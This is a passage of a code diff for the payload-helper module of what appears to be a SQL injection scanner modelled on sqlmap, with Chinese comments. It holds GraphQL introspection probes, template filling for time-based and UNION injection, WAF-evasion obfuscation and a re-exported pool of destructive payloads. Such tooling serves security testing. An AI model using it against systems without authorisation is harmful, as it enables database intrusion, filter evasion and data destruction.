+  { name: '字段别名', query: 'query { alias_probe: __typename }', sig: /__typename|alias_probe/ },
+  { name: '批处理', query: '[{"query":"query { __typename }"},{"query":"query { q1: __typename q2: __typename }"}]', sig: /__typename|__schema/ },
+  { name: '循环查询', query: 'query { __schema { types { name fields { name } } } }', sig: /__schema|types/ },
+];
+
+/**
+ * 填充 payload 模板中的占位符
+ * @param {string} template 含占位符的模板
+ * @param {{orig?: string, sleep?: number, num?: number, sep?: string}} vars 占位符值
+ * @returns {string} 填充后的 payload
+ */
+// 生成 N 个 NULL 占位（UNION SELECT 中非回显列填空，回显列由 WRAP 包裹结果替换）
+// 非正数时至少返回 1 个 NULL，避免生成空序列导致 UNION 列数错配。
+export function nullSequence(columns) {
+  const n = Number.isFinite(columns) && columns > 0 ? columns : 1;
+  return Array.from({ length: n }, () => 'NULL').join(',');
+}
+
+export function fillPayload(template, vars = {}) {
+  return template
+    .replaceAll('{ORIG}', vars.orig ?? '')
+    .replaceAll('{SLEEP}', String(vars.sleep ?? 1))
+    .replaceAll('{NUM}', String(vars.num ?? Math.floor(Math.random() * 9000) + 1000))
+    .replaceAll('{SEP}', vars.sep ?? '-- -');
+}
+
+/**
+ * WAF 规避混淆（仅将 AND/OR 关键词包裹注释，不改变语义）
+ * 已下沉至 core/tamper/obfuscate.js（P1-A2 消除 core→engine 反向依赖），
+ * 此处 re-export 保持向后兼容（Detector/injection/Extractor/测试仍从 payloads 导入）。
+ */
+export { obfuscatePayload } from '../../core/tamper/obfuscate.js';
+
+/**
+ * 生成某 DBMS + 技术 的全部 payload（已填充占位符）
+ * @param {string} dbms
+ * @param {string} technique
+ * @param {object} vars
+ * @returns {string[]}
+ */
+export function buildPayloads(dbms, technique, vars = {}) {
+  const list = (PAYLOADS[dbms] && PAYLOADS[dbms][technique]) || [];
+  return list.map((t) => fillPayload(t, vars));
+}
+
+/**
+ * 取某 DBMS + 技术 的原始模板列表（未填充占位符）
+ * @param {string} dbms
+ * @param {string} technique
+ * @returns {string[]}
+ */
+export function getPayloadGroup(dbms, technique) {
+  return (PAYLOADS[dbms] && PAYLOADS[dbms][technique]) || [];
+}
+
+// ==================== 子句位置变体消费 helper（对标 sqlmap clause 属性筛选） ====================
+// 检测器约定：主模板未命中且 config.level >= 2 时才调用（level=1 完全不消费，请求数零变化）；
+// 有界：maxPerClause 限制单 clause 单技术条数、maxTotal 限制单库单技术总量。
+
+/**
+ * 取某 DBMS + 技术 的子句位置模板（带 clause 元数据，未填充占位符）
+ * @param {string} dbms
+ * @param {string} technique error / time（boolean 走 getClausePairs 真假对）
+ * @param {{maxPerClause?: number, maxTotal?: number}} opts 有界截断（默认 3 / 8）
+ * @returns {{clause: string, tpl: string}[]}
+ */
+export function getClauseTemplates(dbms, technique, { maxPerClause = 3, maxTotal = 8 } = {}) {
+  const out = [];
+  const group = CLAUSE_PAYLOADS[dbms];
+  if (!group) return out;
+  for (const [clause, techs] of Object.entries(group)) {
+    const list = techs && techs[technique];
+    if (!Array.isArray(list) || list.length === 0) continue;
+    // 仅取字符串单模板（error/time）；boolean 在结构中为真假对（数组），走 getClausePairs 消费
+    for (const tpl of list.filter((x) => typeof x === 'string').slice(0, maxPerClause)) {
+      if (out.length >= maxTotal) return out;
+      out.push({ clause, tpl });
+    }
+  }
+  return out;
+}
+
+/**
+ * 取某 DBMS + 技术 的子句位置模板（已填充占位符，带 clause 元数据）
+ * @param {string} dbms
+ * @param {string} technique
+ * @param {object} vars fillPayload 变量（orig/sleep/num/sep）
+ * @param {{maxPerClause?: number, maxTotal?: number}} opts
+ * @returns {{clause: string, payload: string}[]}
+ */
+export function buildClausePayloads(dbms, technique, vars = {}, opts = {}) {
+  return getClauseTemplates(dbms, technique, opts).map((t) => ({ clause: t.clause, payload: fillPayload(t.tpl, vars) }));
+}
+
+/**
+ * 取某 DBMS 的子句位置布尔真假对（带 clause 元数据；含 where 括号闭合补充变体）
+ * @param {string} dbms
+ * @param {{maxTotal?: number}} opts 有界截断（默认 6 对）
+ * @returns {{clause: string, trueTpl: string, falseTpl: string}[]}
+ */
+export function getClausePairs(dbms, { maxTotal = 6 } = {}) {
+  const out = [];
+  const group = CLAUSE_PAYLOADS[dbms];
+  if (!group) return out;
+  for (const [clause, techs] of Object.entries(group)) {
+    const pairs = techs && techs.boolean;
+    if (!Array.isArray(pairs)) continue;
+    for (const pair of pairs) {
+      if (out.length >= maxTotal) return out;
+      if (Array.isArray(pair) && pair.length === 2 && pair[0] && pair[1]) {
+        out.push({ clause, trueTpl: pair[0], falseTpl: pair[1] });
+      }
+    }
+  }
+  return out;
+}
+
+/**
+ * 取某 DBMS 的子句位置布尔真假对（已填充占位符，带 clause 元数据）
+ * @param {string} dbms
+ * @param {object} vars fillPayload 变量
+ * @param {{maxTotal?: number}} opts
+ * @returns {{clause: string, truePayload: string, falsePayload: string}[]}
+ */
+export function buildClausePairs(dbms, vars = {}, opts = {}) {
+  return getClausePairs(dbms, opts).map((p) => ({
+    clause: p.clause,
+    truePayload: fillPayload(p.trueTpl, vars),
+    falsePayload: fillPayload(p.falseTpl, vars),
+  }));
+}
+
+// ==================== 高危 payload 池再导出 ====================
+// 调用方（CLI --risk=3 / REST 显式确认）可按需启用；默认路径不消费，零回归。
+export {
+  DESTRUCTIVE_PAYLOADS,
+  DESTRUCTIVE_MIN_RISK,
+  enableDestructivePayloads,
+  getDestructiveTemplates,
+};
